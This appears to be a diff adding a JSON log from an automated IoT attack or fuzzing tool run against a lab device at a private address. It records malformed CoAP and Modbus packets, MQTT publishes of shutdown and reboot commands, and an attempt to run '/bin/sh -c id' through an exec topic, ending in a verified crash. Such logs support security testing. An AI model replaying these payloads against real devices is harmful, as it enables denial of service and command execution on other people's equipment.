@@ -1,0 +1,236 @@
+[
+  {
+    "timestamp": 1774284621.0468824,
+    "target_ip": "192.168.100.25",
+    "target_arch": "Unknown",
+    "tool_used": "coap_send",
+    "payload_hex": "40011234010203",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "40011234010203",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 10005,
+      "details": "No CoAP response within timeout \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1774284621.059642,
+    "target_ip": "192.168.100.25",
+    "target_arch": "Unknown",
+    "tool_used": "modbus_request",
+    "payload_hex": "0001000003e8010300000001",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 111] Connection refused",
+      "sent_hex": "0001000003e8010300000001"
+    }
+  },
+  {
+    "timestamp": 1774284622.1494863,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "6d616c6963696f75735f7061796c6f6164",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.25:1883",
+      "topic": "test/topic",
+      "payload": "malicious_payload",
+      "published": true,
+      "timing_ms": 3
+    }
+  },
+  {
+    "timestamp": 1774284735.232352,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [
+        "iot/sensors/humidity",
+        "iot/sensors/pressure",
+        "iot/sensors/temperature"
+      ],
+      "messages_received": 4
+    }
+  },
+  {
+    "timestamp": 1774284797.2696612,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.25:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 7
+    }
+  },
+  {
+    "timestamp": 1774284870.8858752,
+    "target_ip": "192.168.100.25",
+    "target_arch": "Unknown",
+    "tool_used": "tcp_send",
+    "payload_hex": "0000000000000000",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 104] Connection reset by peer",
+      "sent_hex": "0000000000000000"
+    }
+  },
+  {
+    "timestamp": 1774284939.8790607,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a2273687574646f776e227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.25:1883",
+      "topic": "iot/commands/shutdown",
+      "payload": "{\"action\":\"shutdown\"}",
+      "published": true,
+      "timing_ms": 7
+    }
+  },
+  {
+    "timestamp": 1774284948.7532928,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  },
+  {
+    "timestamp": 1774284968.3758802,
+    "target_ip": "192.168.100.25",
+    "target_arch": "Unknown",
+    "tool_used": "coap_send",
+    "payload_hex": "40011234ddffff",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "sent_hex": "40011234ddffff",
+      "response_hex": "",
+      "response_len": 0,
+      "timing_ms": 10012,
+      "details": "No CoAP response within timeout \u2014 device may have dropped or crashed"
+    }
+  },
+  {
+    "timestamp": 1774284968.3883634,
+    "target_ip": "192.168.100.25",
+    "target_arch": "Unknown",
+    "tool_used": "modbus_request",
+    "payload_hex": "000100000800010300000001",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 111] Connection refused",
+      "sent_hex": "000100000800010300000001"
+    }
+  },
+  {
+    "timestamp": 1774284991.7317228,
+    "target_ip": "192.168.100.25",
+    "target_arch": "Unknown",
+    "tool_used": "tcp_send",
+    "payload_hex": "000100000006010300000001",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": false,
+      "details": "Connection failed: [Errno 111] Connection refused",
+      "sent_hex": "000100000006010300000001"
+    }
+  },
+  {
+    "timestamp": 1774285004.7737052,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22616374696f6e223a227265626f6f74227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.25:1883",
+      "topic": "iot/commands/reboot",
+      "payload": "{\"action\":\"reboot\"}",
+      "published": true,
+      "timing_ms": 7
+    }
+  },
+  {
+    "timestamp": 1774285005.795024,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_publish",
+    "payload_hex": "7b22636d64223a2265786563222c22746172676574223a222f62696e2f7368222c2261726773223a222d63206964227d",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "success": true,
+      "broker": "192.168.100.25:1883",
+      "topic": "iot/commands/exec",
+      "payload": "{\"cmd\":\"exec\",\"target\":\"/bin/sh\",\"args\":\"-c id\"}",
+      "published": true,
+      "timing_ms": 6
+    }
+  },
+  {
+    "timestamp": 1774285010.830232,
+    "target_ip": "192.168.100.25",
+    "target_arch": "linux-arm",
+    "tool_used": "mqtt_subscribe",
+    "payload_hex": "",
+    "packets_sent": 1,
+    "outcome": "delivered",
+    "details": {
+      "topics_seen": [],
+      "messages_received": 0
+    }
+  },
+  {
+    "timestamp": 1774285022.1139364,
+    "target_ip": "192.168.100.25",
+    "target_arch": "Unknown",
+    "tool_used": "verify_crash",
+    "payload_hex": "",
+    "packets_sent": 2,
+    "outcome": "crash_verified",
+    "details": {
+      "status": "crashed",
+      "verified": true,
+      "ip": "192.168.100.25",
+      "details": "Ping OK but all probed ports [502, 4242, 5683] unresponsive",
+      "vulnerability_id": "391635e8f1b5"
+    }
+  }
+]
